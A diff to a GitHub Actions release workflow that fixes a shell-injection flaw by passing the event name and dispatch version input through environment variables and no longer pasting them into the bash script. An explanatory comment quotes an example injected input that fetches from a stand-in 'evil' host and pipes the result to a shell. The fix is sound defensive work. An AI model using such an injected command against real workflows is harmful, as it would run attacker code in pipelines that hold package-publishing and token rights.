@@ -82,12 +82,22 @@ jobs:
       prerelease: ${{ steps.v.outputs.prerelease }}
     steps:
       - id: v
+        # Through `env:`, never interpolated into the script body.  A `${{ }}`
+        # expansion is pasted in as SHELL TEXT before bash ever sees the line,
+        # so a workflow_dispatch input of `x"; curl evil|sh; :"` was executed
+        # rather than assigned -- in a workflow whose later jobs hold
+        # `packages: write` and `id-token: write`.  Every other job in this file
+        # already does it this way (see "assemble the tarball" below); this one
+        # did not.
+        env:
+          EVENT_NAME: ${{ github.event_name }}
+          INPUT_VERSION: ${{ inputs.version }}
         run: |
           set -euo pipefail
-          if [ "${{ github.event_name }}" = "push" ]; then
+          if [ "$EVENT_NAME" = "push" ]; then
             VERSION="${GITHUB_REF_NAME}"
-          elif [ -n "${{ inputs.version }}" ]; then
-            VERSION="${{ inputs.version }}"
+          elif [ -n "$INPUT_VERSION" ]; then
+            VERSION="$INPUT_VERSION"
           else
             # A dispatch has no tag.  Stamp it so the artifact is obviously not
             # a release: nobody should mistake a button-press build for one.
